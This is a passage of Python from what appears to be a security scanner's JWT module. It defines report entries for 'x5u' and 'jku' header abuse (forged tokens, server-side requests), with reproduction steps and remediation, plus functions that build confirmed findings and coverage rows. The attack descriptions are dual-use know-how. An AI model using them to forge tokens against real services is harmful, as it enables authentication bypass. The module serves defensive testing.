                        "token's own 'x5u' header and used its public key to validate the token. "
                        "The certificate was self-signed by the tester."),
        "success_oracle": ("an out-of-band request for the tester's certificate arrived from the "
                           "target AND the token signed with the matching private key matched the "
                           "authenticated control while a signature-tampered token was refused"),
        "impact": ("Sign a token for any user with a self-signed certificate: complete "
                   "authentication bypass. The fetch is also a server-side request to an "
                   "attacker-chosen URL."),
        "remediation": ("Ignore 'x5u', or resolve it only against an allowlist of exact trusted "
                        "URLs and validate the chain to a pinned CA; never trust a certificate the "
                        "token points at."),
    },
    CHECK_JKU_FETCHED: {
        "title": "JWT 'jku' header URL fetched by the server (key not shown to be trusted)",
        "severity": "medium", "cwe": "CWE-918", "cvss_score": 5.3,
        "description": ("The server made an outbound request to a URL supplied in the token's "
                        "'jku' header. The forged token was NOT accepted, so the key set was "
                        "fetched but is not shown to have been trusted."),
        "success_oracle": ("a correlated out-of-band interaction arrived from the target after the "
                           "token was sent; the acceptance test separately returned a non-accept"),
        "impact": ("A server-side request to an attacker-chosen URL: reach internal services and "
                   "cloud metadata from the server's network position."),
        "remediation": ("Do not dereference URLs taken from a token header; if a key set must be "
                        "fetched, resolve it against an exact allowlist."),
    },
    CHECK_X5U_FETCHED: {
        "title": "JWT 'x5u' header URL fetched by the server (certificate not shown to be trusted)",
        "severity": "medium", "cwe": "CWE-918", "cvss_score": 5.3,
        "description": ("The server made an outbound request to a URL supplied in the token's "
                        "'x5u' header. The forged token was NOT accepted, so the certificate was "
                        "fetched but is not shown to have been trusted."),
        "success_oracle": ("a correlated out-of-band interaction arrived from the target after the "
                           "token was sent; the acceptance test separately returned a non-accept"),
        "impact": ("A server-side request to an attacker-chosen URL: reach internal services and "
                   "cloud metadata from the server's network position."),
        "remediation": ("Do not dereference URLs taken from a token header; if a certificate must "
                        "be fetched, resolve it against an exact allowlist and pin the chain."),
    },
}


def finding_for(verdict: dict, url: str) -> dict | None:
    """A report-shaped finding, or `None` for any verdict that is not CONFIRMED.

    Returning `None` rather than a low-confidence row is deliberate: a `rejected` or `not_tested`
    JWT probe has no place in a findings list, and a caller that wants the operator to see what was
    not tested calls `coverage_rows()`, which is where that information belongs.
    """
    if not isinstance(verdict, dict) or verdict.get("verdict") != VERDICT_CONFIRMED:
        return None
    spec = _FINDING_SPEC.get(verdict.get("check", ""))
    if spec is None:
        return None
    evidence = str(verdict.get("evidence") or "").strip()
    if not evidence:
        return None                     # a confirmation with no evidence is not a confirmation
    tags = ["jwt", "auth", verdict["check"]]
    if spec["cwe"] == "CWE-918":
        tags.append("ssrf")
    return {
        "title": spec["title"], "severity": spec["severity"], "family": "jwt",
        "confidence": "confirmed", "target": url, "cwe": spec["cwe"],
        "cvss_score": spec["cvss_score"],
        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        "description": spec["description"], "evidence": evidence,
        "success_oracle": spec["success_oracle"], "impact": spec["impact"],
        "remediation": spec["remediation"],
        "reproduction_steps": [
            "Capture a genuine token and the endpoint's authenticated response (positive control).",
            "Capture the same request with no token (negative control) and with one signature byte "
            "flipped -- both must be refused, or the test is vacuous.",
            "Send the forged token (%s) to %s and compare against both controls."
            % (verdict.get("shape") or spec["title"], url),
        ],
        "tags": tags,
    }


def coverage_rows(verdicts: list) -> list:
    """The checks that produced no finding, and WHY -- so a not-tested check is never silently
    indistinguishable from a clean one in the report."""
    out = []
    for v in verdicts or []:
        if not isinstance(v, dict) or v.get("verdict") == VERDICT_CONFIRMED:
            continue
        out.append({"check": v.get("check", ""), "verdict": v.get("verdict", VERDICT_NOT_TESTED),
                    "shape": v.get("shape", ""), "reason": v.get("reason", "")})
    return out
